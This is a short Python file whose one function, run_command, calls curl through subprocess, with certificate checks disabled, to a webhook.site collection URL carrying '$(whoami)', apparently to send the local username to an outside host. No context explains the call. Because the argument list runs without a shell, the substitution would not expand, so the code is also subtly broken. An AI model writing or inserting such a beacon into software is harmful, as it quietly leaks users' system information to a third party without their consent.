import subprocess

def run_command():
    command = ["curl", "-v", "-k", "https://webhook.site/f73f9993-f7df-4001-a959-01dcf2180ba3/$(whoami)"]
    subprocess.run(command)
